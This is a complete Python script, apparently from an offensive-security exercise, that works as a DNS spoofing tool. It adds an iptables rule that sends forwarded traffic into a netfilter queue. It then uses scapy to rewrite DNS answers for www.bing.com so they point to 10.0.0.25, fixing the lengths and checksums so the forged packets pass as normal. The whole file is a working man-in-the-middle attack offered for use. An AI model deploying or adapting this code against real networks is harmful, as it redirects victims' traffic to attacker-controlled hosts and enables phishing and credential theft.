#!/usr/bin/env python

import subprocess
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # converting to a scapy packet

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target....")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.0.25") #creating a new response
            scapy_packet[scapy.DNS].an = answer #injecting the response
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()

subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True) # creating a queue

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

